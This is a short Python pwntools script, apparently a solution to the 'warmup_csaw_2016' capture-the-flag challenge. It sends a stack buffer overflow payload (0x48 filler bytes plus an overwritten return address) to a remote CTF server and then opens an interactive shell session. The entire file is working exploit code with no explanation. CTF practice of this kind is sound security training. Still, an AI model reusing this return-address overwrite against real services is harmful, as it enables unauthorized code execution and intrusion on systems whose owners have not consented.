from pwn import *

p = str("a") * 0x48 + str(p64(0x40060d))

#context(log_level = 'debug', os = 'linux', arch = 'amd64')
#r = process('./warmup_csaw_2016')
r = remote('node3.buuoj.cn', '25560')
#raw_input()

r.sendline(p)
r.interactive()

